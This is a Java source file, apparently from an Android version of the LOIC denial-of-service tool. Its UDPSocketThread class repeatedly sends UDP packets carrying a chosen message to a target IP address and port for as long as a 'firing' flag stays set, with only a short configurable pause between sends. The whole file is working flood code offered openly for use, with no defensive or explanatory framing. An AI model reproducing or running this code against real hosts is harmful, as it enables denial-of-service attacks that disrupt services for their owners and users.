package genius.mohammad.loic;

/**
 * Copyright 2013 Mohammad Adib
 * 
 * Licensed under the Apache License, Version 2.0 (the "License"); you may
 * not use this file except in compliance with the License. You may obtain a
 * copy of the License at
 * 
 * http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations
 * under the License.
 */

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class UDPSocketThread implements Runnable {

	private String ip, message;
	private int port, pause;
	
	public static long startTime = 0;
	public static int count = 0;

	public UDPSocketThread(String ip, int port, String message, int pause) {
		this.ip = ip;
		this.port = port;
		this.message = message;
		this.pause = pause;
	}

	@Override
	public void run() {
		count = 0;
		startTime = System.currentTimeMillis();
		while (ServiceDenier.firing) {
			try {
				DatagramSocket clientSocket = new DatagramSocket();
				InetAddress IPAddress = InetAddress.getByName(ip);
				byte[] sendData = new byte[1024];
				sendData = message.getBytes();
				DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, IPAddress, port);
				clientSocket.send(sendPacket);
				count++;
				Thread.sleep(pause);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
